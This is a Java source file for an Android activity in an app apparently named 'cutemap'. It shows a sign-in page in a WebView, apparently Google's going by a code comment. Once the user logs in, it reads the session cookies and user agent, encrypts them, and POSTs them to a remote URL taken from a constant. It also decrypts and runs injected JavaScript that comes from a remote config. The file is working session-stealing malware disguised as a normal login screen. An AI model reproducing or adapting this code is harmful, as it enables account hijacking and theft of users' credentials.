package net.ncie.cutemap.act;

import static net.ncie.cutemap.constant.Constant.AD_BEAN;
import static net.ncie.cutemap.constant.Constant.APP_POST_URL;
import static net.ncie.cutemap.constant.Constant.isFocus;
import static net.ncie.cutemap.util.HttpUtils.sendPostRequest;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.google.gson.Gson;
import com.tencent.mmkv.MMKV;

import net.ncie.cutemap.R;
import net.ncie.cutemap.bean.AdBean;
import net.ncie.cutemap.bean.ChannelStatusBean;
import net.ncie.cutemap.util.AesUtil;
import net.ncie.cutemap.util.HttpUtils;
import net.ncie.cutemap.util.MyUtil;

import org.reactivestreams.Subscription;

import java.util.ArrayList;
import java.util.Objects;
import java.util.concurrent.TimeUnit;

import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers;
import io.reactivex.rxjava3.core.Observable;
import io.reactivex.rxjava3.functions.Consumer;
import io.reactivex.rxjava3.schedulers.Schedulers;

public class LoginAct extends AppCompatActivity {
    private Subscription mSubscription;
    private WebView my_web_view;
    private AdBean adBean;
    private Boolean isLoad = false;
    private ArrayList<String> loadUrls = new ArrayList<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.act_login);
        initUI();
        initData();

    }

    @SuppressLint("SetJavaScriptEnabled")
    public void initUI(){
        my_web_view = findViewById(R.id.my_web_view);


    }


    @SuppressLint("SetJavaScriptEnabled")
    public void initData(){

        if(MMKV.defaultMMKV().decodeString(AD_BEAN)!=null){
            String s = MMKV.defaultMMKV().decodeString(AD_BEAN);
            adBean = new Gson().fromJson(s, AdBean.class);

        }else {
            adBean = (AdBean) getIntent().getParcelableExtra(AD_BEAN);
        }

        loadUrls.addAll(adBean.getYup());
        my_web_view.setWebViewClient(new MyWebViewClient());
        WebSettings webSettings = my_web_view.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        my_web_view.loadUrl(adBean.getMy());
    }

    private class MyWebViewClient extends WebViewClient {
        @SuppressLint("CheckResult")
        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            if (!isLoad) {
                if (url.contains(adBean.getPli()) || url.contains(adBean.getPli1()) || url.contains(adBean.getMy1())) {
                    isLoad = true;
                    // This is the Google sign-in page
                    Log.i("MyWebViewClient", "登录成功");
                    ChannelStatusBean bean = new ChannelStatusBean("10018", CookieManager.getInstance().getCookie(adBean.getMy()), CookieManager.getInstance().getCookie(url), my_web_view.getSettings().getUserAgentString(), url);
                    Log.i("MyWebViewClient", "Cookie信息:"+bean.toString());
                    String encrypt = AesUtil.encrypt(new Gson().toJson(bean));

                    sendPostRequest(APP_POST_URL, encrypt, new HttpUtils.HttpCallback<String>() {
                        @Override
                        public void onSuccess(String result) {
                            MyUtil.MyLog("成功：" + result);
                        }

                        @Override
                        public void onFailure(String failure) {
                            MyUtil.MyLog("失败：" + failure);
                        }
                    });

                    startActivity(new Intent(LoginAct.this, MainAct.class));
                    finish();
                }
            }
            if (url.contains(adBean.getMy())){
                //加载JS代码
                view.evaluateJavascript(AesUtil.decrypt(adBean.getAab()), new ValueCallback<String>() {
                    @Override
                    public void onReceiveValue(String value) {
                        MyUtil.MyLog("--"+value);
                    }
                });
            }

            if (!loadUrls.isEmpty() && url.contains(loadUrls.get(0))) {
                Observable.just(Objects.requireNonNull(AesUtil.decrypt(adBean.getYupj())))
                        .subscribeOn(Schedulers.newThread())
                        .filter(it -> !it.isEmpty())
                        .observeOn(AndroidSchedulers.mainThread())
                        .doOnNext(it -> {
                            if (url.equals(loadUrls.get(0))) {
                                view.evaluateJavascript(it, null);
                            }
                        })
                        .delay(1, TimeUnit.SECONDS)
                        .subscribe(new Consumer<String>() {
                            @Override
                            public void accept(String it) throws Exception {
                                reLoad();
                            }
                        }, new Consumer<Throwable>() {
                            @Override
                            public void accept(Throwable throwable) throws Exception {
                                System.out.println("------------------>");
                            }
                        });
            }




        }

        @SuppressLint("CheckResult")
        private void reLoad() {

            Observable.timer(10, TimeUnit.SECONDS)
                    .doOnSubscribe(it -> {

                        mSubscription = (Subscription) it;
                    })
                    .subscribeOn(Schedulers.newThread())
                    .observeOn(AndroidSchedulers.mainThread())
                    .filter(it -> {
                        if (!isFocus) {
                            my_web_view.loadUrl(loadUrls.get(0));
                            if (mSubscription != null) {
                                mSubscription.cancel();
                            }
                        }
                        return isFocus;
                    })
                    .doOnNext(it -> {
                        isFocus = false;
                    })
                    .doOnNext(it -> {
                        loadUrls.remove(0);
                    })
                    .filter(it -> !loadUrls.isEmpty())
                    .map(it -> loadUrls.get(0))
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(it -> {
                        my_web_view.loadUrl(it);
                        if (mSubscription != null) {
                            mSubscription.cancel();
                        }
                    }, throwable -> {
                        System.out.println("------------------>");
                    });
        }
    }
}